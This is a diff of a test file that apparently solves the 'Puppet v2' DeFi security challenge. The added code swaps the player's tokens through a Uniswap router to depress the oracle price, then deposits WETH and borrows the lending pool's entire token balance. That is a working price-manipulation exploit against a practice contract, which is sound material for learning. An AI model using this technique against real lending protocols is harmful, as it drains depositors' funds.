@@ -85,32 +85,18 @@ describe('[Challenge] Puppet v2', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
-        // let receiver = await (await ethers.getContractFactory('FlashSwapReceiver', player)).deploy(
-        //     uniswapExchange.address, weth.address, lendingPool.address, token.address, player.address,
-        //     {gasLimit: 1e6}
-        // );
-
-        // let funcSig = ethers.utils.id("borrow(uint256)").slice(0,10);
-        // let calldata = ethers.utils.hexConcat([
-        //     funcSig, 
-        //     ethers.utils.defaultAbiCoder.encode(['uint256'], [POOL_INITIAL_TOKEN_BALANCE])
-        //     ]);
-        await token.connect(player).approve(uniswapExchange.address, PLAYER_INITIAL_TOKEN_BALANCE);
-        await uniswapExchange.connect(player).swap(
-            PLAYER_INITIAL_TOKEN_BALANCE, 0, player.address, '0x',
+        await token.connect(player).approve(uniswapRouter.address, PLAYER_INITIAL_TOKEN_BALANCE);
+        await uniswapRouter.connect(player).swapExactTokensForETH(
+            PLAYER_INITIAL_TOKEN_BALANCE, 
+            1, 
+            [token.address, weth.address],
+            player.address, 
+            2n * 10n ** 10n,
             {gasLimit: 1e6}
         );
-        
-        // let price = calculateTokenToEthInputPrice(PLAYER_INITIAL_TOKEN_BALANCE, UNISWAP_INITIAL_TOKEN_RESERVE, UNISWAP_INITIAL_WETH_RESERVE);
-        // console.log(ethers.utils.formatEther(price));
-        // let price2 = (POOL_INITIAL_TOKEN_BALANCE * 10n ** 18n) * (UNISWAP_INITIAL_WETH_RESERVE - price) / (UNISWAP_INITIAL_TOKEN_RESERVE + PLAYER_INITIAL_TOKEN_BALANCE); 
-        // console.log(UNISWAP_INITIAL_WETH_RESERVE - price);
-        // console.log(UNISWAP_INITIAL_TOKEN_RESERVE + PLAYER_INITIAL_TOKEN_BALANCE);
-        // console.log(price2);
-        // let depositRequired = (price2 * 3n) / 10n ** 18n;
-        // console.log(ethers.utils.formatEther(depositRequired));
-        // let userBal = price + PLAYER_INITIAL_ETH_BALANCE;
-        // console.log(ethers.utils.formatEther(userBal));
+        await weth.connect(player).deposit({value: 295n * 10n ** 17n});
+        await weth.connect(player).approve(lendingPool.address, 295n * 10n ** 17n);
+        await lendingPool.connect(player).borrow(POOL_INITIAL_TOKEN_BALANCE);
     });
 
     after(async function () {
